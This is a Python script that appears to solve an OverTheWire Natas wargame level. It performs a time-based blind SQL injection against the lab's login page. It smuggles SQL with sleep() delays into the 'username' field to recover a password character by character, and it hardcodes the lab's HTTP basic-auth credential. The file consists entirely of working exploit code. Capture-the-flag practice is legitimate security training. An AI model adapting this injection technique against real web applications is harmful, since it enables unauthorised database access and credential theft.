from requests import post
from requests.auth import HTTPBasicAuth
from string import ascii_letters, digits
from datetime import datetime

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"

possbile_characters = ascii_letters + digits
characters_used = ""
password = ""

for char in possbile_characters:
  r = post(
    url=url,
    data={
      'username': f'natas18" AND password LIKE BINARY "%{char}%" AND sleep(1) #',
    },
    auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
  )
  if r.elapsed.seconds >= 1:
    characters_used += char
    print(characters_used, end='')

print("")
for i in range(0, 32):
  for char in characters_used:
    r = post(
      url=url,
      data={
        'username': f'natas18\" and password LIKE BINARY "{password + char}%" AND sleep(1) #',
      },
      auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
    )
    if r.elapsed.seconds >= 1:
      password += char
      print(password, end="")
      break
